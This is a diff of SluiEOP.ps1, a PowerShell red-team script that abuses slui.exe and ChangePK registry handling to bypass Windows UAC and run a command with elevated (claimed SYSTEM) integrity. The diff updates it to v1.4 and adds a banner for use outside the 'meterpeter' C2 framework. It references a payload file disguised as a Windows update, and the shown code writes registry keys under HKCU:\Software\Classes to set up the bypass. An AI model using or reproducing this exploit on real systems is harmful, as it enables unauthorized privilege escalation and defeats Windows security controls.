@@ -1,13 +1,13 @@
 <#
 .SYNOPSIS
-   SluiEOP can be used for privilege escalation or to execute one command with high integrity (admin)
+   SluiEOP can be used for privilege escalation or to execute one command with high integrity (SYSTEM)
 
    Author: r00t-3xp10it (SSA RedTeam @2020)
    Tested Under: Windows 10 - 18363.778
    EOP Disclosure By: @mattharr0ey
    Required Dependencies: none
    Optional Dependencies: none
-   PS Script Dev Version: v1.3
+   PS Script Dev Version: v1.4
 
 .DESCRIPTION
    How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
@@ -57,6 +57,12 @@ If(-not($param1) -or $param1 -eq $null){
 ## Check Vulnerability before continue any further ..
 $CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
 If($CheckVuln -eq $True){
+
+   ## For those who run SluiEOP.ps1 outside meterpeter C2
+   If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
+      Write-Host "SluiEOP v1.4 - By: r00t-3xp10it (SSAredTeam)" -ForeGroundColor Green
+      Write-Host "[+] Executing Command: '$Command' (SYSTEM)"
+   }
 
    ### Add Entrys to Regedit {using powershell}
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Seconds 1
